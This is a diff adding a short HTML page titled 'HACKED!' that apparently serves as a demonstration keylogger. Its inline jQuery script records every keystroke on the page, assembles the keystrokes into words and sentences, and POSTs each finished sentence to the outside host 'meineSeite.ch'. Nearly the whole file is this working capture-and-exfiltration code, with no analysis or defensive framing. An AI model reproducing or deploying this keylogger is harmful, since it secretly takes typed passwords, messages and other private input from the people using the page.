@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>HACKED!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        var keys = [];
+        var words = [];
+        $(document).on('keydown', (e) => {
+            let key = e.originalEvent.key;
+            keys.push(key);
+            if(key === ' '){
+                finishedWord();
+            }
+            if(key === '.'){
+                finishedWord();
+                finishedSentence();
+            }
+        })
+        function finishedWord(){
+            let word = keys.join('');
+            console.log("FINISHED WORD!", word);
+            words.push(word);
+            keys.length = 0;
+        }
+        function finishedSentence(){
+            var sentence = words.join('');
+            words.length = 0;
+            console.log("FINISHED SENTENCE!", sentence);
+            sendData(sentence);
+        }
+        function sendData(sentence){
+            $.ajax({
+                url: 'meineSeite.ch',
+                method: 'POST',
+                data: {
+                    sentence
+                },
+                success: () => {
+                    console.log("Successfully sent");
+                }
+            })
+        }
+    </script>
+</head>
+<body>
+    
+</body>
+</html>
